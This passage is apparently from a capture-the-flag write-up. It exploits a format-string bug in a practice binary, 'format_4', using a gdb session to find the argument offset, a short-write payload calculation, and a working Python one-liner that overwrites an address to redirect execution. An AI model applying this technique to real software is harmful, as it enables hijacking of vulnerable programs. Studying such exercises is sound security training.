gdb-peda$ b * 0x0804854c
Breakpoint 1 at 0x804854c: file format_4.c, line 20.
gdb-peda$ r
Starting program: format_4 
AAAA 
...Trim...
[-------------------------------------code-------------------------------------]
   0x804853e <vuln+35>:	call   0x80483b0 <fgets@plt>
   0x8048543 <vuln+40>:	lea    eax,[ebp-0x208]
   0x8048549 <vuln+46>:	mov    DWORD PTR [esp],eax
=> 0x804854c <vuln+49>:	call   0x8048390 <printf@plt>
   0x8048551 <vuln+54>:	mov    DWORD PTR [esp],0x1
...Trim...

gdb-peda$ x $esp
0xffffcef0:	0xffffcf00

gdb-peda$ p/d (0xffffcf00-0xffffcef0)/4
$1 = 4
```
As seen above, the offset is 4 bytes.

It's possible to validate by select 4th argument via **$** (direct access) as well.

```
$ ./format_4
AAAA%4$x
AAAA41414141                     
```

The following payload is created by using short writes method as explained in format-3 solution.

Target address: **0804a020**
Target value: **080484fd**

Let's split **080484fd** into **0x84fd** and **0x0804**.

0x0804 in decimal: **2052** 
0x84fd in decimal: **34045**

So we will write the following:

1. **34045** to **0804a020**
2. **2052** to **0804a022**

Payload calculation in-short: 
```
"\x22\xa0\x04\x08" + "\x20\xa0\x04\x08" + "%(2052-8)d" + "%4\$hn" + "%(34045-2052)d" + "%5\$hn"
```

It's possible to validate via gdb as shown on format-3 solution.

#### 2.3 Final PoC

```
$ python -c 'print "\x22\xa0\x04\x08\x20\xa0\x04\x08%2044d%4$hn%31993d%5$hn"' | ./format_4
"� �                                                                     ...TRIM...
512
...TRIM...
-134493152
code execution redirected! you win
```

**Note:** If first half the addreses are same then last 2 bytes would be enough to solve the challenge.
